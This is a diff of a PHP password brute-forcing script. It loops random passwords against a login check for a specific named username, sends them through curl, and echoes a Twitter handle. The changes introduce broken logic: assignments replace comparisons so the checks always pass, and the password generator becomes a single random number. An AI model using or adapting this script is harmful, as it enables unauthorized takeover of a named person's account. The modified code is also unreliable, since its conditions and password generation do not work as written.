@@ -6,9 +6,9 @@ $username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
 while(True) {
     for ($Pass = 1; $Pass < 16; $Pass++) {
-        $Pass = str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
+        $Pass = mt_rand(strlen("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"));
         if(check_correct($username, $Pass)) {
-            if ($str != $startpagina) {
+            if ($str = $startpagina) {
             die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
@@ -23,7 +23,7 @@ while(True) {
         }
     }
     
-    if ($str != $incorrect) {
+    if ($str = $incorrect) {
     echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
@@ -51,7 +51,7 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c);
-        if($str != $incorrect) {return true;}
+        if($str = $incorrect) {return true;}
         else {return false;}
 }
 
